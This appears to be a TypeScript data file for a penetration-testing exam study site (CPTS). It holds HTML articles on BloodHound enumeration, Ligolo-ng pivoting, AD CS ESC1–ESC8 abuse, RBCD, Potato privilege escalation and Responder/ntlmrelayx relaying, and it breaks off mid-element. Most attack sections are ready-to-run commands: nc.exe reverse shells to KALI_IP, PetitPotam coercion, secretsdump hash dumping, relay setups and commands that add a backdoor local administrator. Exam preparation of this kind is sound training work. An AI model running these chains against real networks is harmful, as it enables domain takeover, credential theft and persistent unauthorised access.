export interface ResearchTopic {
  slug: string;
  title: string;
  category: string;
  summary: string;
  toc: { anchor: string; label: string }[];
  content: string;
}

export const researchTopics: ResearchTopic[] = [
  {
    slug: "bloodhound",
    title: "BloodHound Advanced Queries",
    category: "Active Directory",
    summary: "Custom Cypher queries, shortest path analysis to Domain Admins, Kerberoastable accounts, DCSync rights, LAPS targets, and ACL abuse paths for comprehensive AD enumeration.",
    toc: [
      { anchor: "setup", label: "Collection & Setup" },
      { anchor: "core-queries", label: "Core Cypher Queries" },
      { anchor: "attack-paths", label: "Attack Path Analysis" },
      { anchor: "custom-queries", label: "Custom Query Library" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="setup">Collection & Setup</h2>
<p>BloodHound requires SharpHound (Windows) or BloodHound.py (Linux/remote) for collection. For CPTS, you'll typically use BloodHound.py from Kali since you start with domain credentials.</p>
<pre><code># BloodHound.py — collect all methods remotely
pip3 install bloodhound
bloodhound-python -u svc_user -p 'Password1!' -d corp.local -dc DC01.corp.local -c All --zip

# SharpHound — from a compromised Windows host
.\SharpHound.exe -c All --zipfilename bh-data.zip

# Neo4j setup (required before BloodHound GUI)
sudo neo4j start
# Default creds: neo4j / neo4j → change on first login
bloodhound &amp;</code></pre>

<div class="tip-box">
<strong>Tip:</strong> Use <code>-c All</code> for comprehensive collection. If stealth matters, <code>-c DCOnly</code> queries only the DC (no computer sessions — faster but misses local admin paths).
</div>

<h2 id="core-queries">Core Cypher Queries</h2>
<p>BloodHound's built-in queries cover most attack paths. Use the Raw Query box (top of GUI) for custom Cypher. Neo4j query language — all nodes are labeled <code>User</code>, <code>Computer</code>, <code>Group</code>, <code>Domain</code>, <code>GPO</code>, <code>OU</code>, <code>Container</code>.</p>

<h3>Find Shortest Path to Domain Admins</h3>
<pre><code>MATCH p=shortestPath((n)-[*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NOT n=m
RETURN p</code></pre>

<h3>All Kerberoastable Users</h3>
<pre><code>MATCH (u:User {hasspn:true}) WHERE u.enabled=true
RETURN u.name, u.serviceprincipalnames, u.admincount
ORDER BY u.admincount DESC</code></pre>

<h3>DCSync Rights (DS-Replication-Get-Changes-All)</h3>
<pre><code>MATCH p=(n)-[:DCSync|AllExtendedRights|GenericAll]->(m:Domain)
RETURN p</code></pre>

<h3>Accounts with AdminCount=1 (Protected Users)</h3>
<pre><code>MATCH (u:User {admincount:1}) WHERE u.enabled=true
RETURN u.name ORDER BY u.name</code></pre>

<h3>Computers with LAPS Disabled</h3>
<pre><code>MATCH (c:Computer {haslaps:false}) RETURN c.name, c.operatingsystem</code></pre>

<h2 id="attack-paths">Attack Path Analysis</h2>
<h3>Path from Owned User to DA</h3>
<pre><code># Mark your compromised user as Owned first (right-click → Mark as Owned)
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p</code></pre>

<h3>Find All GenericWrite/GenericAll Paths</h3>
<pre><code>MATCH p=(u:User)-[:GenericWrite|GenericAll|WriteDacl|WriteOwner|Owns]->(n)
WHERE u.enabled=true
RETURN p LIMIT 50</code></pre>

<h3>ForceChangePassword Paths</h3>
<pre><code>MATCH p=(u:User)-[:ForceChangePassword]->(v:User)
RETURN u.name AS attacker, v.name AS target</code></pre>

<h3>Local Admin Rights (CanRDP / AdminTo)</h3>
<pre><code>MATCH p=(u:User)-[:AdminTo]->(c:Computer)
WHERE u.name = "SVC_SQL@CORP.LOCAL"
RETURN p</code></pre>

<h2 id="custom-queries">Custom Query Library</h2>
<h3>AS-REP Roastable Accounts</h3>
<pre><code>MATCH (u:User {dontreqpreauth:true}) WHERE u.enabled=true RETURN u.name</code></pre>

<h3>Users with Unconstrained Delegation</h3>
<pre><code>MATCH (c:Computer {unconstraineddelegation:true}) WHERE c.name &lt;&gt; "DC01.CORP.LOCAL"
RETURN c.name, c.operatingsystem</code></pre>

<h3>Constrained Delegation Targets</h3>
<pre><code>MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name</code></pre>

<h3>Groups with Dangerous Rights to Computers</h3>
<pre><code>MATCH p=(g:Group)-[:AdminTo|CanRDP|ExecuteDCOM|AllowedToDelegate]->(c:Computer)
WHERE g.name &lt;&gt; "DOMAIN ADMINS@CORP.LOCAL"
RETURN p LIMIT 100</code></pre>

<h3>Cross-Domain Trust Paths</h3>
<pre><code>MATCH p=(n)-[:HasForeignGroupMembership|HasForeignSecurityPrincipal]->(m)
RETURN p</code></pre>

<h2 id="tips">Exam Tips</h2>
<div class="tip-box">
<strong>CPTS Strategy:</strong> Run BloodHound immediately after getting domain creds. Mark all compromised accounts as Owned as you go — BloodHound re-calculates paths from owned nodes. The "Find Shortest Paths to Domain Admins from Owned Principals" built-in query is your best friend.
</div>
<ul>
<li>If no path exists from your user, look for paths via <strong>groups</strong> your user is a member of</li>
<li><strong>ReadGMSAPassword</strong> edges often lead to service account takeover → privilege escalation</li>
<li><strong>WriteSPN</strong> on a user = you can Kerberoast them (targeted Kerberoasting)</li>
<li>Always check <strong>Inbound Object Control</strong> panel on each node — lists who can attack this object</li>
<li><strong>AddSelf</strong> right on a group = add yourself to that group, potentially gaining its privileges</li>
</ul>`,
  },
  {
    slug: "ligolo-ng",
    title: "Ligolo-ng Double Pivot",
    category: "Active Directory",
    summary: "Multi-hop tunneling through segmented AD networks using Ligolo-ng agent chaining. Route injection, interface management, and traffic routing without proxychains.",
    toc: [
      { anchor: "overview", label: "How Ligolo-ng Works" },
      { anchor: "single-pivot", label: "Single Pivot Setup" },
      { anchor: "double-pivot", label: "Double Pivot (Agent Chain)" },
      { anchor: "socks5", label: "SOCKS5 + Proxychains" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="overview">How Ligolo-ng Works</h2>
<p>Ligolo-ng creates a TUN interface on your attacker machine. Traffic routed to that interface is tunneled through the agent connection to the target network — no proxychains required. Each agent can forward traffic to its local network.</p>
<p>Architecture for double pivot:</p>
<pre><code>Kali → [TUN interface] → Agent1 (DMZ host) → [Agent2 listener] → Agent2 (Internal host) → Internal Network</code></pre>

<h2 id="single-pivot">Single Pivot Setup</h2>
<pre><code># 1. Download binaries from GitHub (ligolo-ng releases)
# Attacker (Kali): run the proxy
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601

# Target (compromised host): upload and run agent
./agent -connect KALI_IP:11601 -ignore-cert

# Back in proxy console:
session        # select Agent1
ifconfig       # see target's interfaces
# Add route to internal network (e.g., 172.16.5.0/24)
sudo ip route add 172.16.5.0/24 dev ligolo
start          # start tunnel

# Now scan 172.16.5.0/24 directly from Kali
nmap -sV 172.16.5.0/24</code></pre>

<h2 id="double-pivot">Double Pivot (Agent Chain)</h2>
<p>For double pivot, Agent2 needs to reach back to your proxy. Since Agent2 is on an internal network, you route Agent2's connection through Agent1 using a <strong>listener</strong> on Agent1.</p>
<pre><code># Step 1: On Kali, start proxy (same as before)
./proxy -selfcert -laddr 0.0.0.0:11601

# Step 2: Connect Agent1 (DMZ host) to proxy
# [Agent1 session active in proxy console]

# Step 3: Add listener on Agent1 to forward Agent2's connection
# In proxy console with Agent1 selected:
listener_add --addr 0.0.0.0:11602 --to 127.0.0.1:11601

# This means: Agent1 listens on port 11602, forwards to proxy on Kali

# Step 4: On internal host (Agent2), connect to Agent1:11602
./agent -connect AGENT1_IP:11602 -ignore-cert

# Step 5: In proxy console — you now see two sessions
session        # select Agent2

# Step 6: Add second TUN interface for the second pivot
sudo ip tuntap add user kali mode tun ligolo2
sudo ip link set ligolo2 up

# Step 7: In proxy, set interface for this session
# (press 's' to start — prompts to select which tunnel interface to use)
start

# Step 8: Add route to deep internal network via ligolo2
sudo ip route add 192.168.100.0/24 dev ligolo2

# Now you can reach 192.168.100.0/24 directly from Kali</code></pre>

<div class="warn-box">
<strong>Warning:</strong> The <code>listener_add</code> command opens a port on the Agent1 host. Ensure the firewall allows inbound on that port from Agent2's subnet, or the connection will fail silently.
</div>

<h2 id="socks5">SOCKS5 + Proxychains (Alternative)</h2>
<p>The TUN interface handles most protocols natively. Use SOCKS5 only when a specific tool requires it (e.g., some Python scripts). Note: <code>listener_add</code> creates TCP port forwarders (agent-side binding → Kali target) — it is <strong>not</strong> a SOCKS5 proxy.</p>
<pre><code># SOCKS5 proxy — run in proxy console with a session active:
socks5 start --addr 127.0.0.1 --port 1080
# This creates a SOCKS5 proxy on Kali that routes through the selected agent tunnel

# Stop it:
socks5 stop

# Configure proxychains to use it:
# /etc/proxychains4.conf:
socks5 127.0.0.1 1080

# Use with tools that need proxychains:
proxychains nmap -sT -Pn 192.168.100.5 -p 445

# listener_add — separate feature (TCP port forwarder on the agent side):
# listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80
# → Opens port 8080 on the agent host, forwards to Kali:80
# Useful for: making your Kali web server reachable from the internal network</code></pre>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>Always run <code>ifconfig</code> on each agent session to map out new subnets before adding routes</li>
<li>Use <code>listener_list</code> in the proxy console to see all active listeners/forwarders</li>
<li>If agent disconnects, routes remain — just reconnect and <code>start</code> again (no route re-add needed)</li>
<li>For RDP/WinRM through the tunnel, use the IP directly (no proxychains needed — traffic routes via TUN)</li>
<li>Ligolo-ng beats Chisel for CPTS because you get a proper TUN interface — Nmap SYN scans work natively</li>
</ul>`,
  },
  {
    slug: "adcs-esc",
    title: "AD CS ESC1–ESC8 Attack Chains",
    category: "Active Directory",
    summary: "Complete Certipy-driven exploitation of all 8 Active Directory Certificate Services misconfigurations — from vulnerable template enrollment to CA private key theft.",
    toc: [
      { anchor: "esc1", label: "ESC1 — Template Enrollee SAN" },
      { anchor: "esc2", label: "ESC2 — Any Purpose EKU" },
      { anchor: "esc3", label: "ESC3 — Enrollment Agent" },
      { anchor: "esc4", label: "ESC4 — Template Write Access" },
      { anchor: "esc5", label: "ESC5 — PKI Object Access Control" },
      { anchor: "esc6", label: "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2" },
      { anchor: "esc7", label: "ESC7 — CA Officer Rights" },
      { anchor: "esc8", label: "ESC8 — NTLM Relay to AD CS" },
      { anchor: "workflow", label: "General Workflow" },
    ],
    content: `
<h2 id="workflow">General Workflow</h2>
<pre><code># Step 1: Find all vulnerable templates
certipy find -u 'user@corp.local' -p 'Password1!' -dc-ip 10.10.10.5 -vulnerable -stdout

# Step 2: Identify ESC type from output
# Step 3: Request certificate exploiting the ESC
# Step 4: Authenticate with certificate to get TGT or NT hash
certipy auth -pfx admin.pfx -dc-ip 10.10.10.5
# Output: NT hash for the impersonated user</code></pre>

<h2 id="esc1">ESC1 — Template Allows Enrollee-Supplied SAN</h2>
<p><strong>Condition:</strong> Template has <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> + any domain user can enroll + Client Authentication EKU.</p>
<pre><code># Request certificate as Domain Admin (supply UPN of DA in SAN)
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'VulnerableTemplate' -upn 'administrator@corp.local' -dc-ip 10.10.10.5

# Authenticate with resulting pfx to get DA hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
# → NT hash: aad3b435b51404eeaad3b435b51404ee:8f617b...

# Use hash with secretsdump
impacket-secretsdump corp.local/administrator@10.10.10.5 -hashes :8f617b...</code></pre>

<h2 id="esc2">ESC2 — Any Purpose EKU or No EKU</h2>
<p><strong>Condition:</strong> Template has <code>Any Purpose</code> EKU or no EKU at all. Can be used as enrollment agent certificate.</p>
<pre><code># Request Any Purpose cert
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'AnyPurposeTemplate' -dc-ip 10.10.10.5

# Use as enrollment agent (treat like ESC3 second step)
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'User' -on-behalf-of 'corp\\administrator' \\
  -pfx anyPurpose.pfx -dc-ip 10.10.10.5</code></pre>

<h2 id="esc3">ESC3 — Enrollment Agent Certificates</h2>
<p><strong>Condition:</strong> Two templates — one with Certificate Request Agent EKU, another allowing enrollment agent certificates.</p>
<pre><code># Step 1: Get enrollment agent cert
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'EnrollmentAgentTemplate' -dc-ip 10.10.10.5

# Step 2: Request cert on behalf of DA using enrollment agent
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'User' -on-behalf-of 'corp\\administrator' \\
  -pfx jdoe.pfx -dc-ip 10.10.10.5

# Step 3: Auth as DA
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5</code></pre>

<h2 id="esc4">ESC4 — Write Privileges Over Certificate Template</h2>
<p><strong>Condition:</strong> Domain user has <code>WriteProperty</code> or <code>WriteDACL</code> on a template object. Convert template to ESC1.</p>
<pre><code># Modify template to add CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
certipy template -u 'jdoe@corp.local' -p 'Password1!' \\
  -template 'TargetTemplate' -save-old -dc-ip 10.10.10.5

# Now exploit as ESC1
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'TargetTemplate' -upn 'administrator@corp.local' -dc-ip 10.10.10.5

# Restore original template
certipy template -u 'jdoe@corp.local' -p 'Password1!' \
  -template 'TargetTemplate' -configuration TargetTemplate.json -dc-ip 10.10.10.5</code></pre>

<h2 id="esc5">ESC5 — PKI Object Access Control</h2>
<p><strong>Condition:</strong> A principal has dangerous rights (GenericAll, GenericWrite, WriteDacl, WriteOwner) over PKI-related objects: the CA server computer object, the <code>NTAuthCertificates</code> container, or the <code>Cert Publishers</code> group. Compromising these objects enables escalation to full CA control.</p>
<p>ESC5 is not a standalone attack — it is a path to gaining ManageCA or ManageCertificates rights, which then enables ESC7.</p>

<h3>Scenario: GenericWrite on CA Computer Object</h3>
<pre><code># Identify: BloodHound → find GenericWrite/GenericAll edges to the CA computer object
# Example: your user has GenericWrite on the CA server computer object "CERTSRV$"

# Step 1: Configure shadow credentials on the CA computer object
certipy shadow auto -u 'jdoe@corp.local' -p 'Password1!' \\
  -account 'CERTSRV$' -dc-ip 10.10.10.5
# → NT hash of CERTSRV$ machine account

# Step 2: Authenticate as the CA machine account
export KRB5CCNAME='CERTSRV$.ccache'

# Step 3: With the CA machine account, you have ManageCA rights on the CA itself
# Now proceed with ESC7 — add officer, enable SubCA template, request + issue cert
certipy ca -u 'CERTSRV$@corp.local' -hashes :<NT_HASH> -ca 'CORP-CA' \\
  -add-officer 'CERTSRV$' -dc-ip 10.10.10.5</code></pre>

<h3>Scenario: GenericWrite on Cert Publishers Group</h3>
<pre><code># Cert Publishers group members can publish certificates to AD
# Adding yourself enables publishing of custom certs (enables manual PKINIT paths)

# PowerView — add your user to Cert Publishers
Add-DomainGroupMember -Identity 'Cert Publishers' -Members 'jdoe' -Credential $cred

# Or via net rpc:
net rpc group addmem "Cert Publishers" "jdoe" \\
  -U corp.local/jdoe%'Password1!' -S 10.10.10.5</code></pre>

<div class="tip-box">
<strong>Key Point:</strong> ESC5 is often discovered through BloodHound by searching for principals with write access to the CA computer object (<code>certsrv</code> or similar). The resulting access typically leads to ESC7 exploitation — treat ESC5 as "path to ESC7."
</div>

<h2 id="esc6">ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
<p><strong>Condition:</strong> CA has the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag set — any template allowing enrollment can include arbitrary SAN.</p>
<pre><code># Check CA flag
certipy find -u 'jdoe@corp.local' -p 'Password1!' -dc-ip 10.10.10.5 -stdout | grep -i "editf"

# Request any enrollable cert with DA SAN
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -template 'User' -upn 'administrator@corp.local' -dc-ip 10.10.10.5

certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5</code></pre>

<h2 id="esc7">ESC7 — CA Officer / Manager Rights</h2>
<p><strong>Condition:</strong> User has <code>ManageCertificates</code> or <code>ManageCA</code> rights on the CA itself.</p>
<pre><code># Grant self Officer rights (with ManageCA)
certipy ca -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -add-officer jdoe -dc-ip 10.10.10.5

# Enable a disabled dangerous template
certipy ca -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \\
  -enable-template 'SubCA' -dc-ip 10.10.10.5

# Request cert from SubCA as admin (Failed, needs approval)
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \
  -template 'SubCA' -upn 'administrator@corp.local' -dc-ip 10.10.10.5

# Issue the failed request with ManageCertificates rights
certipy ca -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \
  -issue-request <request_id> -dc-ip 10.10.10.5

# Retrieve the issued certificate
certipy req -u 'jdoe@corp.local' -p 'Password1!' -ca 'CORP-CA' \
  -retrieve <request_id> -dc-ip 10.10.10.5</code></pre>

<h2 id="esc8">ESC8 — NTLM Relay to AD CS Web Enrollment</h2>
<p><strong>Condition:</strong> CA has web enrollment enabled (<code>/certsrv</code>) and doesn't require HTTPS or EPA.</p>
<pre><code># Check if web enrollment exists
curl -k http://10.10.10.5/certsrv/

# Use PetitPotam or PrinterBug to coerce DC authentication
# Relay to CA web enrollment to get DC certificate
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp \\
  -smb2support --adcs --template 'DomainController'

# Coerce DC$ to authenticate to you
python3 PetitPotam.py -u 'jdoe' -p 'Password1!' KALI_IP DC_IP

# ntlmrelayx outputs base64 cert — save as dc.pfx
# Use DC cert to dump hashes via DCSync
certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
impacket-secretsdump -just-dc-ntlm corp.local/DC$@10.10.10.5 \\
  -hashes :&lt;NT hash from certipy auth&gt;</code></pre>

<div class="tip-box">
<strong>CPTS Exam:</strong> ESC1 and ESC8 are the most common in HTB labs. Always run <code>certipy find -vulnerable</code> immediately after getting domain creds. The output tells you exactly which ESC applies.
</div>`,
  },
  {
    slug: "rbcd",
    title: "RBCD Full Walkthrough",
    category: "Active Directory",
    summary: "Resource-Based Constrained Delegation from WriteProperty to S4U2Self/S4U2Proxy — impersonating any user to a target service including Domain Admin.",
    toc: [
      { anchor: "concept", label: "RBCD Concept" },
      { anchor: "requirements", label: "Requirements" },
      { anchor: "attack", label: "Attack Chain" },
      { anchor: "impacket", label: "With Impacket" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="concept">RBCD Concept</h2>
<p>Resource-Based Constrained Delegation (RBCD) allows a service account to impersonate any user to a target computer, controlled by the <strong>target computer's</strong> <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute. If you can write this attribute on a computer object, you can make any machine account impersonate any user to that computer.</p>

<h2 id="requirements">Requirements</h2>
<ul>
<li><strong>WriteProperty/GenericWrite on a Computer object</strong> — e.g., via BloodHound edge on the target machine</li>
<li><strong>A machine account</strong> you control — any computer account in the domain (or create one via MachineAccountQuota if MAQ > 0)</li>
<li><strong>Impacket or Rubeus</strong> for the S4U2Self/S4U2Proxy ticket request</li>
</ul>

<h2 id="attack">Attack Chain</h2>
<pre><code># Step 1: Check MachineAccountQuota (default is 10 — domain users can add machines)
Get-ADDefaultDomainPasswordPolicy | Select MachineAccountQuota
# Or with CME:
nxc ldap DC_IP -u user -p pass -M maq

# Step 2: Create a fake machine account
impacket-addcomputer corp.local/jdoe:'Password1!' \\
  -computer-name 'FAKEMACHINE$' -computer-pass 'FakePass123!' -dc-ip 10.10.10.5

# Step 3: Configure RBCD — set FAKEMACHINE$ as trusted to act on behalf on TARGET$
impacket-rbcd corp.local/jdoe:'Password1!' \\
  -delegate-from 'FAKEMACHINE$' -delegate-to 'TARGET$' \\
  -action write -dc-ip 10.10.10.5

# Step 4: Get TGT for FAKEMACHINE$
impacket-getTGT corp.local/'FAKEMACHINE$':'FakePass123!' -dc-ip 10.10.10.5
export KRB5CCNAME='FAKEMACHINE$.ccache'

# Step 5: S4U2Self + S4U2Proxy — get service ticket as Administrator
impacket-getST corp.local/'FAKEMACHINE$':'FakePass123!' \
  -spn cifs/TARGET.corp.local -impersonate Administrator -dc-ip 10.10.10.5
export KRB5CCNAME='Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache'

# Step 6: Use the ticket
impacket-smbclient -k -no-pass corp.local/Administrator@TARGET.corp.local
impacket-wmiexec -k -no-pass corp.local/Administrator@TARGET.corp.local</code></pre>

<h2 id="impacket">With Rubeus (Windows)</h2>
<pre><code># Step 1: Add fake machine (PowerMad)
New-MachineAccount -MachineAccount FAKEMACHINE -Password (ConvertTo-SecureString 'FakePass123!' -AsPlainText -Force)

# Step 2: Get SID of FAKEMACHINE$
Get-ADComputer FAKEMACHINE

# Step 3: Set msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$
$sd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-xxx-yyy-zzz-1234)"
$sdBytes = New-Object byte[] ($sd.BinaryLength)
$sd.GetBinaryForm($sdBytes, 0)
Get-ADComputer TARGET | Set-ADComputer -Replace @{'msds-allowedtoactonbehalfofotheridentity'=$sdBytes}

# Step 4: S4U chain via Rubeus
.\Rubeus.exe s4u /user:FAKEMACHINE$ /rc4:&lt;NTLM of FakePass123!&gt; \\
  /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt

# Step 5: Access target
dir \\TARGET.corp.local\C$</code></pre>

<div class="tip-box">
<strong>Quick Win:</strong> BloodHound will show <code>GenericWrite</code> edges to computer objects. Any such edge = potential RBCD attack. The most common scenario: helpdesk users with GenericWrite on workstations.
</div>

<h2 id="tips">Exam Tips</h2>
<ul>
<li>If MAQ=0, look for an existing machine account password you cracked — use that instead of creating a new one</li>
<li>Verify RBCD was set: <code>Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity</code></li>
<li>The <code>-impersonate</code> user must be a domain user — impersonating <code>krbtgt</code> won't work</li>
<li>RBCD with Impacket requires matching DNS — ensure <code>/etc/hosts</code> has DC and target entries</li>
<li>Clean up: remove RBCD attribute and delete fake machine after exam to avoid leaving artifacts</li>
</ul>`,
  },
  {
    slug: "potato-attacks",
    title: "Potato Attacks Comparison",
    category: "Privilege Escalation",
    summary: "PrintSpoofer vs JuicyPotato vs GodPotato vs SweetPotato — when to use which, OS compatibility matrix, and current patch/bypass status for Windows privilege escalation.",
    toc: [
      { anchor: "overview", label: "Overview & Requirement" },
      { anchor: "printspoofer", label: "PrintSpoofer" },
      { anchor: "juicypotato", label: "JuicyPotato" },
      { anchor: "godpotato", label: "GodPotato" },
      { anchor: "comparison", label: "Comparison Table" },
      { anchor: "tips", label: "Exam Tips" },
    ],
    content: `
<h2 id="overview">Overview & Requirement</h2>
<p>All "Potato" attacks target <strong>SeImpersonatePrivilege</strong> (or SeAssignPrimaryTokenPrivilege). These privileges are commonly held by service accounts (IIS, MSSQL, network services). The attacks trick a SYSTEM-level process into authenticating to a rogue server, then impersonate that token.</p>
<pre><code># Check current privileges
whoami /priv
# Look for: SeImpersonatePrivilege — Enabled</code></pre>

<h2 id="printspoofer">PrintSpoofer</h2>
<p>Exploits the Print Spooler service (<code>spoolsv.exe</code>) via named pipe impersonation. Works on Windows 10/Server 2016/2019. <strong>Does NOT require COM object enumeration.</strong></p>
<pre><code># Upload PrintSpoofer64.exe to target
.\PrintSpoofer64.exe -i -c cmd
# -i = interactive, -c = command to run as SYSTEM

# Spawn reverse shell as SYSTEM
.\PrintSpoofer64.exe -c "C:\Windows\Temp\nc.exe KALI_IP 4444 -e cmd.exe"

# Works on: Windows 10, Server 2016, Server 2019
# Patched: No (Print Spooler vulnerability class ongoing)</code></pre>

<h2 id="juicypotato">JuicyPotato</h2>
<p>Uses DCOM + COM server CLSID lookup to escalate via token impersonation. Requires a specific CLSID for the target OS. Patched on Windows 10 1809+ and Server 2019+.</p>
<pre><code># Find working CLSID for your OS from:
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe \\
  -a "KALI_IP 4444 -e cmd.exe" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}

# -l = COM port, -p = binary, -a = arguments, -c = CLSID
# Works on: Server 2008, 2012, 2016, Windows 7, 8, 10 (pre-1809)
# Patched: Windows 10 1809+, Server 2019+</code></pre>

<h2 id="godpotato">GodPotato</h2>
<p>Modern replacement for JuicyPotato. Works on Windows Server 2012–2022 and Windows 8–11. No CLSID enumeration needed. Uses ImpersonateNamedPipeClient.</p>
<pre><code># Simplest usage — run command as SYSTEM
.\GodPotato-NET4.exe -cmd "cmd /c whoami"

# Reverse shell
.\GodPotato-NET4.exe -cmd "C:\Windows\Temp\nc.exe KALI_IP 4444 -e cmd.exe"

# Multiple versions: NET2, NET35, NET4 — match .NET version on target
# Works on: Windows 8–11, Server 2012–2022
# Patched: Not patched as of 2026</code></pre>

<h2 id="comparison">Comparison Table</h2>
<table class="data-table">
<tr><th>Tool</th><th>OS Support</th><th>Requirement</th><th>CLSID Needed</th><th>Status 2026</th></tr>
<tr><td>PrintSpoofer</td><td>Win10, Srv2016/2019</td><td>SeImpersonate</td><td>No</td><td>Working</td></tr>
<tr><td>JuicyPotato</td><td>Pre-2019 only</td><td>SeImpersonate</td><td>Yes</td><td>Patched on 2019+</td></tr>
<tr><td>GodPotato</td><td>Win8–11, Srv2012–2022</td><td>SeImpersonate</td><td>No</td><td>Working</td></tr>
<tr><td>SweetPotato</td><td>Win10, Srv2016-2022</td><td>SeImpersonate</td><td>No</td><td>Working</td></tr>
<tr><td>RoguePotato</td><td>Win10, Srv2019</td><td>SeImpersonate</td><td>No</td><td>Working</td></tr>
</table>

<h2 id="tips">Exam Tips</h2>
<ul>
<li><strong>Default choice for modern systems:</strong> GodPotato (broadest compatibility, no CLSID)</li>
<li><strong>PrintSpoofer</strong> if Print Spooler is running and you're on Server 2016/2019</li>
<li>Verify Print Spooler: <code>sc query spooler</code> — status must be RUNNING</li>
<li>Upload to <code>C:\\Windows\\Temp</code> — writeable by all service accounts</li>
<li>AV may flag these binaries — try obfuscated/compiled versions or use <code>-cmd</code> to add user instead of spawning shell</li>
<li>Add local admin: <code>net user hacker Pass123! /add && net localgroup administrators hacker /add</code></li>
</ul>`,
  },
  {
    slug: "responder-ntlmrelay",
    title: "Responder + NTLMRelayx Chain",
    category: "Active Directory",
    summary: "LLMNR/NBT-NS poisoning to credential capture and relay — targeting machines with SMB signing disabled to achieve code execution or domain escalation.",
    toc: [
      { anchor: "concept", label: "How Poisoning Works" },
      { anchor: "capture", label: "Credential Capture (Hash)" },
      { anchor: "relay", label: "NTLM Relay Attack" },
      { anchor: "targets", label: "Relay Target Discovery" },
      { anchor: "escalation", label: "Domain Escalation via Relay" },
      { anchor: "tips", label: "Defense & Exam Tips" },
    ],
    content: `
<h2 id="concept">How Poisoning Works</h2>
<p>When a Windows machine tries to resolve a hostname that doesn't exist in DNS, it broadcasts LLMNR (Link-Local Multicast Name Resolution) and NBT-NS queries. Responder answers these with your IP, forcing the victim to authenticate to you with their NTLM credentials.</p>

<h2 id="capture">Credential Capture (Hash Only)</h2>
<pre><code># Start Responder to capture NTLMv2 hashes
sudo responder -I eth0 -wfv
# -w = WPAD proxy server, -f = fingerprinting, -v = verbose

# Wait for authentication attempts — hashes saved to:
# /usr/share/responder/logs/SMB-NTLMv2-*.txt

# Crack with hashcat
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt

# Example hash format:
# Administrator::CORP:aabbccddeeff0011:ABC123...:0101000...</code></pre>

<h2 id="relay">NTLM Relay Attack</h2>
<p>Instead of cracking, relay the hash directly to another machine. Requires: <strong>SMB signing disabled</strong> on the target (not the DC — DCs always have signing enabled).</p>
<pre><code># Step 1: Disable SMB in Responder (we relay, not capture)
sudo nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Step 2: Find relay targets (machines without SMB signing)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# Step 3: Start ntlmrelayx targeting those machines
impacket-ntlmrelayx -tf targets.txt -smb2support

# Step 4: Start Responder
sudo responder -I eth0 -wfv

# When a victim authenticates → ntlmrelayx relays to targets.txt
# Default action: dumps SAM database of target if admin relay successful</code></pre>

<h2 id="targets">Relay Target Discovery</h2>
<pre><code># Find targets without SMB signing (relay candidates)
nxc smb 10.10.10.0/24 --gen-relay-list unsigned.txt
nmap --script smb-security-mode -p 445 10.10.10.0/24 | grep -E "message_signing|disabled"</code></pre>

<h2 id="escalation">Domain Escalation via Relay</h2>
<pre><code># Option 1: Get NTLM hashes from SAM (local accounts)
impacket-ntlmrelayx -tf targets.txt -smb2support
# Output: hashes for local admin accounts

# Option 2: Interactive SMB shell on relay target
impacket-ntlmrelayx -tf targets.txt -smb2support -i
# Spawns interactive SMB shell on 127.0.0.1:11000
nc 127.0.0.1 11000

# Option 3: Execute command on relay target
impacket-ntlmrelayx -tf targets.txt -smb2support -c "net user hacker Pass123! /add && net localgroup administrators hacker /add"

# Option 4: Relay to LDAP for shadow credentials / RBCD
impacket-ntlmrelayx -t ldap://DC_IP -smb2support --shadow-credentials --shadow-target 'TARGET$'

# Option 5: Relay to AD CS (ESC8)
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController</code></pre>

<div class="warn-box">
